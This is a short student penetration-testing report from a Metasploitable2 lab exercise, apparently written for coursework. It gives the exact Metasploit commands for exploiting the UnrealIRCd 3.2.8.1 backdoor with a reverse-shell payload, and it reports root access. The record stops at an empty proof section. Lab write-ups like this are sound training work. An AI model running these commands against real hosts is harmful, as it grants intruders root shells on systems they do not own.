# Penetration Testing Report - Metasploitable2
**Student:** Lennox
**Victim IP:** 192.168.1.4
**Attacker IP:** 192.168.1.5
**Date:** 2026-09-22

## Nmap Scan Result
nmap sV 192.168.1.4

## Exploit 1: UnrealIRCd 3.2.8.1 Backdoor (Port 6667) - DONE ✅
**1. Tool Used:** Metasploit - exploit/unix/irc/unreal_ircd_3281_backdoor
**2. Why this tool:** Nmap showed port 6667 running UnrealIRCd 3.2.8.1. This version has a known backdoor. Metasploit automates it and gives reverse shell.
**3. Exact Steps:**
```bash
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.4
set LHOST 192.168.1.5
set PAYLOAD cmd/unix/reverse
exploit
whoami
# returned root
Kill Chain: Exploitation > installation > Command and Control
Proof ( exploit 1 )

